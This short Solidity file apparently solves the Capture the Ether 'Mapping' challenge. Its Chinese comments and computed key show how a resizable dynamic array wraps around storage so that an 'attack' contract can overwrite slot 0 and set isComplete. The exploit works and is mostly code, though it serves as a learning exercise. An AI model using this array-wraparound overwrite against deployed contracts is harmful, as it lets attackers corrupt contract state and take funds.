pragma solidity ^0.5.0;

contract MappingChallenge {
    bool public isComplete;//在slot 0中
    uint256[] map;//在slot 1中

    function set(uint256 key, uint256 value) public {
        // Expand dynamic array as needed
        if (map.length <= key) {
            map.length = key + 1;
        }

        map[key] = value;//只要使key的位置在slot 0的位置
        //将value改为1
    }

    function get(uint256 key) public view returns (uint256) {
        return map[key];
    }
}
//key=2**256-uint256(keccack256(bytes32(1)))    =   35707666377435648211887908874984608119992236509074197713628505308453184860938
contract attack
{
    constructor(address add)public
    {
        MappingChallenge m=MappingChallenge(add);
        m.set(35707666377435648211887908874984608119992236509074197713628505308453184860938,1);
    }
}

